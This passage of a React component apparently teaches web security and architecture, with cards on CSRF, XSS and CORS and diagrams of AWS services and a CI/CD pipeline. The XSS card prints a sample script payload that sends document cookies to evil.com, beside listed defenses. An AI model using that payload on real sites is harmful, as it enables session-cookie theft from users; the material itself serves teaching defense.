              <div className="bg-rose-50/50 border-2 border-rose-200 rounded-2xl p-5 flex flex-col justify-between shadow-sm">
                <div>
                  <div className="flex items-center justify-between mb-3">
                    <span className="font-bold text-rose-900 text-base">CSRF</span>
                    <span className="text-[10px] bg-rose-200 text-rose-800 font-bold px-2 py-0.5 rounded-full">Request Forgery</span>
                  </div>
                  <h4 className="text-xs font-bold text-slate-700 mb-2">Cross-Site Request Forgery</h4>
                  <p className="text-[11px] text-slate-600 mb-4 leading-relaxed">
                    Attacker tricks authenticated browser into submitting unauthorized POST/PUT requests using the victim&apos;s auto-attached session cookies.
                  </p>
                  
                  <div className="bg-white border border-rose-200 rounded-lg p-2.5 mb-3 text-[10px] space-y-1">
                    <div className="font-bold text-rose-800">Attack Vector:</div>
                    <div className="text-slate-600 font-mono">&lt;form action=&quot;bank.com/transfer&quot;&gt;</div>
                  </div>
                </div>

                <div className="border-t border-rose-200 pt-3">
                  <div className="text-[11px] font-bold text-rose-900 mb-1.5 flex items-center gap-1">
                    <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" /> Enterprise Defenses:
                  </div>
                  <ul className="text-[10px] text-slate-700 space-y-1 list-disc pl-4">
                    <li><code>SameSite=Strict/Lax</code> cookies</li>
                    <li>Synchronizer CSRF Token header (<code>X-XSRF-TOKEN</code>)</li>
                    <li>Stateless Bearer JWT APIs (immune)</li>
                  </ul>
                </div>
              </div>

              {/* XSS Card */}
              <div className="bg-amber-50/50 border-2 border-amber-200 rounded-2xl p-5 flex flex-col justify-between shadow-sm">
                <div>
                  <div className="flex items-center justify-between mb-3">
                    <span className="font-bold text-amber-900 text-base">XSS</span>
                    <span className="text-[10px] bg-amber-200 text-amber-800 font-bold px-2 py-0.5 rounded-full">Code Injection</span>
                  </div>
                  <h4 className="text-xs font-bold text-slate-700 mb-2">Cross-Site Scripting</h4>
                  <p className="text-[11px] text-slate-600 mb-4 leading-relaxed">
                    Attacker injects malicious JavaScript (Stored, Reflected, or DOM) that executes within the victim&apos;s browser origin to steal cookies or manipulate the page.
                  </p>
                  
                  <div className="bg-white border border-amber-200 rounded-lg p-2.5 mb-3 text-[10px] space-y-1">
                    <div className="font-bold text-amber-800">Attack Vector:</div>
                    <div className="text-slate-600 font-mono">&lt;script&gt;fetch(&quot;evil.com/&quot;+document.cookie)&lt;/script&gt;</div>
                  </div>
                </div>

                <div className="border-t border-amber-200 pt-3">
                  <div className="text-[11px] font-bold text-amber-900 mb-1.5 flex items-center gap-1">
                    <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" /> Enterprise Defenses:
                  </div>
                  <ul className="text-[10px] text-slate-700 space-y-1 list-disc pl-4">
                    <li><code>HttpOnly</code> cookie flag (blocks JS access)</li>
                    <li>Content Security Policy (CSP headers)</li>
                    <li>Context-aware encoding &amp; Jsoup sanitization</li>
                  </ul>
                </div>
              </div>

              {/* CORS Card */}
              <div className="bg-sky-50/50 border-2 border-sky-200 rounded-2xl p-5 flex flex-col justify-between shadow-sm">
                <div>
                  <div className="flex items-center justify-between mb-3">
                    <span className="font-bold text-sky-900 text-base">CORS</span>
                    <span className="text-[10px] bg-sky-200 text-sky-800 font-bold px-2 py-0.5 rounded-full">Browser SOP Policy</span>
                  </div>
                  <h4 className="text-xs font-bold text-slate-700 mb-2">Cross-Origin Resource Sharing</h4>
                  <p className="text-[11px] text-slate-600 mb-4 leading-relaxed">
                    Browser security mechanism that blocks JavaScript on Origin A from reading responses from Origin B unless server explicitly grants permission via HTTP headers.
                  </p>
                  
                  <div className="bg-white border border-sky-200 rounded-lg p-2.5 mb-3 text-[10px] space-y-1">
                    <div className="font-bold text-sky-800">Preflight Trigger:</div>
                    <div className="text-slate-600 font-mono">OPTIONS + Content-Type: application/json</div>
                  </div>
                </div>

                <div className="border-t border-sky-200 pt-3">
                  <div className="text-[11px] font-bold text-sky-900 mb-1.5 flex items-center gap-1">
                    <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" /> Spring Boot Config:
                  </div>
                  <ul className="text-[10px] text-slate-700 space-y-1 list-disc pl-4">
                    <li><code>CorsConfigurationSource</code> Bean</li>
                    <li>Explicit allowed origins (No <code>*</code> with credentials)</li>
                    <li>Exposed response headers (<code>X-Total-Count</code>)</li>
                  </ul>
                </div>
              </div>

            </div>
          </div>
        </section>

        {/* AWS Architecture */}
        <section>
          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
            <Cloud className="w-6 h-6 text-sky-600" /> AWS Cloud Architecture
          </h2>
          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
            <p className="text-sm text-slate-600 mb-6">
              A standard serverless/managed AWS architecture for a modern web application, demonstrating compute, storage, and networking layers.
            </p>
            
            <div className="bg-slate-50 border border-slate-200 rounded-xl p-6 relative max-w-4xl mx-auto">
              
              {/* Client -> Route53 -> CloudFront */}
              <div className="flex justify-center items-center gap-4 mb-8">
                <div className="bg-white border border-slate-300 p-3 rounded shadow-sm text-center">
                  <div className="text-xs font-bold text-slate-700">Client Browser</div>
                </div>
                <div className="text-slate-400 font-mono text-[10px]">HTTPS</div>
                <div className="bg-sky-50 border border-sky-300 p-3 rounded shadow-sm text-center">
                  <div className="text-sm font-bold text-sky-800">Route 53</div>
                  <div className="text-[10px] text-sky-600">DNS Resolution</div>
                </div>
                <div className="text-slate-400 font-mono text-[10px]">-&gt;</div>
                <div className="bg-sky-50 border border-sky-300 p-3 rounded shadow-sm text-center">
                  <div className="text-sm font-bold text-sky-800">CloudFront</div>
                  <div className="text-[10px] text-sky-600">CDN &amp; Edge Cache</div>
                </div>
              </div>
              
              {/* Compute Layer */}
              <div className="border border-dashed border-sky-300 rounded-lg p-4 bg-white relative mb-8">
                <div className="absolute -top-3 left-4 bg-sky-100 text-sky-800 text-xs font-bold px-2 py-0.5 rounded">Compute Layer (VPC)</div>
                <div className="grid grid-cols-2 gap-8 pt-2">
                  
                  {/* Serverless Track */}
                  <div className="flex flex-col items-center gap-3">
                    <div className="bg-orange-50 border border-orange-300 p-3 rounded shadow-sm text-center w-full">
                      <div className="text-sm font-bold text-orange-800">API Gateway</div>
                      <div className="text-[10px] text-orange-600">REST / Auth</div>
                    </div>
                    <div className="text-slate-400 font-mono text-[10px]">triggers</div>
                    <div className="bg-orange-50 border border-orange-300 p-3 rounded shadow-sm text-center w-full">
                      <div className="text-sm font-bold text-orange-800 flex justify-center items-center gap-1"><Zap className="w-4 h-4"/> Lambda</div>
                      <div className="text-[10px] text-orange-600">Serverless Function</div>
                    </div>
                  </div>
                  
                  {/* Container Track */}
                  <div className="flex flex-col items-center gap-3">
                    <div className="bg-fuchsia-50 border border-fuchsia-300 p-3 rounded shadow-sm text-center w-full">
                      <div className="text-sm font-bold text-fuchsia-800">ALB</div>
                      <div className="text-[10px] text-fuchsia-600">App Load Balancer (L7)</div>
                    </div>
                    <div className="text-slate-400 font-mono text-[10px]">routes to</div>
                    <div className="bg-fuchsia-50 border border-fuchsia-300 p-3 rounded shadow-sm text-center w-full">
                      <div className="text-sm font-bold text-fuchsia-800 flex justify-center items-center gap-1"><Boxes className="w-4 h-4"/> ECS / Fargate</div>
                      <div className="text-[10px] text-fuchsia-600">Serverless Containers</div>
                    </div>
                  </div>
                  
                </div>
              </div>
              
              {/* Storage Layer */}
              <div className="border border-dashed border-slate-300 rounded-lg p-4 bg-white relative">
                <div className="absolute -top-3 left-4 bg-slate-200 text-slate-800 text-xs font-bold px-2 py-0.5 rounded">Storage &amp; Data</div>
                <div className="grid grid-cols-3 gap-4 pt-2">
                  <div className="bg-blue-50 border border-blue-300 p-3 rounded shadow-sm text-center">
                    <div className="text-sm font-bold text-blue-800">DynamoDB</div>
                    <div className="text-[10px] text-blue-600">NoSQL Key-Value</div>
                  </div>
                  <div className="bg-blue-50 border border-blue-300 p-3 rounded shadow-sm text-center">
                    <div className="text-sm font-bold text-blue-800">RDS / Aurora</div>
                    <div className="text-[10px] text-blue-600">Managed Relational</div>
                  </div>
                  <div className="bg-green-50 border border-green-300 p-3 rounded shadow-sm text-center">
                    <div className="text-sm font-bold text-green-800">S3</div>
                    <div className="text-[10px] text-green-600">Object Storage (Assets)</div>
                  </div>
                </div>
              </div>
              
            </div>
          </div>
        </section>

        {/* CI/CD Pipeline */}
        <section>
          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
            <Activity className="w-6 h-6 text-rose-600" /> CI/CD Pipeline (Git to Production)
          </h2>
          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm overflow-x-auto">
            <p className="text-sm text-slate-600 mb-6 min-w-[600px]">
              A standard continuous integration and continuous deployment pipeline using Git, Jenkins, Docker, and AWS (or any container orchestrator).
            </p>
            
            <div className="flex items-center min-w-[800px] pb-4">
               {/* 1. Code */}
               <div className="flex flex-col items-center">
                 <div className="bg-slate-100 border-2 border-slate-300 w-16 h-16 rounded-full flex items-center justify-center font-bold text-slate-700 shadow-sm z-10 relative">
                   Git
                 </div>
                 <div className="text-[10px] text-slate-500 font-bold mt-2 text-center">Developer<br/>Push</div>
               </div>
               
               <div className="flex-1 h-1 bg-slate-300 relative mx-1">
                 <div className="absolute top-1/2 -translate-y-1/2 left-1/2 -translate-x-1/2 bg-white border border-slate-300 text-[9px] px-1 text-slate-500 rounded-sm shadow-sm">Webhook</div>
                 <div className="absolute right-0 top-1/2 -translate-y-1/2 translate-x-1 border-y-4 border-y-transparent border-l-4 border-l-slate-400"></div>
               </div>
               
               {/* 2. Build & Test */}
               <div className="flex flex-col items-center relative z-10">
                 <div className="bg-rose-50 border-2 border-rose-300 rounded-xl p-3 w-48 shadow-sm">
                   <div className="font-bold text-rose-800 text-sm text-center mb-2">Jenkins / CI</div>
                   <div className="flex flex-col gap-1">
                     <div className="bg-white border border-rose-200 text-[10px] px-2 py-1 flex items-center justify-between"><span className="text-slate-600">mvn clean test</span><span className="text-green-500 font-bold">✓</span></div>
                     <div className="bg-white border border-rose-200 text-[10px] px-2 py-1 flex items-center justify-between"><span className="text-slate-600">SonarQube</span><span className="text-green-500 font-bold">✓</span></div>
                   </div>
                 </div>
                 <div className="text-[10px] text-rose-600 font-bold mt-2 text-center">Continuous Integration</div>
               </div>
               
               <div className="flex-1 h-1 bg-slate-300 relative mx-1">
                 <div className="absolute top-1/2 -translate-y-1/2 left-1/2 -translate-x-1/2 bg-white border border-slate-300 text-[9px] px-1 text-slate-500 rounded-sm shadow-sm">Docker Build</div>
                 <div className="absolute right-0 top-1/2 -translate-y-1/2 translate-x-1 border-y-4 border-y-transparent border-l-4 border-l-slate-400"></div>
               </div>
               
               {/* 3. Registry */}
               <div className="flex flex-col items-center z-10">
                 <div className="bg-sky-50 border-2 border-sky-300 rounded-xl p-3 w-32 text-center shadow-sm">
                   <div className="font-bold text-sky-800 text-sm">Docker Registry</div>
                   <div className="text-[10px] bg-white border border-sky-200 mt-2 px-1 py-1 text-slate-600 break-all">myapp:v1.2.3</div>
                 </div>
                 <div className="text-[10px] text-sky-600 font-bold mt-2 text-center">Artifact Storage<br/>(ECR, Harbor)</div>
               </div>
               
               <div className="flex-1 h-1 bg-slate-300 relative mx-1">
                 <div className="absolute top-1/2 -translate-y-1/2 left-1/2 -translate-x-1/2 bg-white border border-slate-300 text-[9px] px-1 text-slate-500 rounded-sm shadow-sm">Deploy</div>
                 <div className="absolute right-0 top-1/2 -translate-y-1/2 translate-x-1 border-y-4 border-y-transparent border-l-4 border-l-slate-400"></div>
               </div>
               
               {/* 4. Production */}
               <div className="flex flex-col items-center z-10">
                 <div className="bg-fuchsia-50 border-2 border-fuchsia-300 rounded-xl p-3 w-40 text-center shadow-sm">
                   <div className="font-bold text-fuchsia-800 text-sm">Production App</div>
                   <div className="flex gap-2 justify-center mt-2">
                     <div className="bg-fuchsia-100 border border-fuchsia-300 w-6 h-6 rounded flex items-center justify-center text-[10px] text-fuchsia-700">Pod</div>
                     <div className="bg-fuchsia-100 border border-fuchsia-300 w-6 h-6 rounded flex items-center justify-center text-[10px] text-fuchsia-700">Pod</div>
                     <div className="bg-fuchsia-100 border border-fuchsia-300 w-6 h-6 rounded flex items-center justify-center text-[10px] text-fuchsia-700">Pod</div>
                   </div>
                 </div>
                 <div className="text-[10px] text-fuchsia-600 font-bold mt-2 text-center">Continuous Deployment<br/>(K8s / ECS)</div>
               </div>
            </div>
          </div>
        </section>

      </div>
    </div>
  );
}
